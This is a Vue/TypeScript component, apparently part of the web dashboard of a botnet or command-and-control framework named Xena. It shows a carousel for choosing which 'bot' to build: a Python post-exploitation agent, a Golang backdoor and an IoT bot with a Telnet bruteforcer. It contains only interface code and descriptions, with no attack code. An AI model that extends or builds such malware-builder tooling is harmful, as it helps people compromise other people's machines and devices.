<template>
  <v-carousel
    v-model = 'gallery_index'
    style = '
      max-height: 384px;
    '  
  >
    <v-carousel-item
      v-for = '(clients, i) in client_chunk'
      :key = 'i'
      class = 'client-gallery'
    >
      <h1
        :class = '
          client_types[gallery_index].class
        '
        class = '
          client-type
          mb-4
        ' 
      >
        {{ client_types[gallery_index].name }}
      </h1>

      <v-row>
        <v-col
          v-for = '(client, i) in clients'
          :key = 'i'
        >
          <BotCard
            :details = 'client'
          />
        </v-col>
      </v-row>
    </v-carousel-item>
  </v-carousel>
</template>

<script lang = 'ts'>
import Vue from 'vue'
import BotCard from '@/components/author/bot-card.vue'

import lodash from 'lodash'

interface ClientType {
  name: string,
  class: string,
}

export default Vue.extend({
  components: {
    BotCard,
  },

  data: () => ({
    gallery_index: 0,
    client_types: [
      {
        name: 'Set your building target',
        class: 'purple-color',
      },
      {
        name: 'Services',
        class: 'purple-color',
      },
    ] as ClientType[],

    client_chunk: lodash.chunk([
      {
        id: 'XENA_BOT_ANACONDA',
        name: 'Anaconda',
        details: `Modular cross-platform post-exploitation agent powered by Python3 interpreted language.
          It allows you to execute custom modules (scripts), through the light-weight mutli-processing core.`,
        logo: '/logo-anaconda.png',
        disabled: true,
      },
      {
        id: 'XENA_BOT_APEP',
        name: 'Apep',
        details: `Cross-platform universal backdoor powered by Golang compiled language.
          Meant to provide the terminal experience like no other.`,
        logo: '/logo-apep.png',
        disabled: false,
      },
      {
        id: 'XENA_BOT_MONOLITIC',
        name: 'Monolitic',
        details: `IoT bot powered by C++ langauge. Built with Telnet bruteforcer and also capable to execute
          payloads up on execution.`,
        logo: '/logo-varvara.png',
        disabled: false,
      },
    ], 3),
  }),

  mounted () {
  }
})
</script>

<style scoped>
.client-gallery {
  padding: 16px 86px 16px 86px;
  background-color: #44475a !important;
  max-height: 360px;
}

.client-type {
  letter-spacing: 2px;
  font-size: 22px;
}
</style>
